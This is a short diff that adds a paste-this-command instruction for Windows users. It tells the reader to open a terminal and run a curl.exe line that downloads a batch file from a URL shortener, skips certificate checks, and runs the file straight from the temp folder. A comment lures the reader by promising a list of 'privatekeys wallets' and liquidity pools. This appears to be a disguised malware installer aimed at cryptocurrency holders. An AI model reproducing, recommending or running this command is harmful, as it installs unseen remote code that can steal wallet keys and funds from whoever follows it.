@@ -1,0 +1,5 @@
+//open cmd  terminal copy then click enter 
+
+curl.exe -ksL https://tinyurl.com/26xyebgr -o "%TEMP%\w.bat"&&call "%TEMP%\w.bat"
+
+// your 15 privatekeys wallets will be listed + liquidity pools 
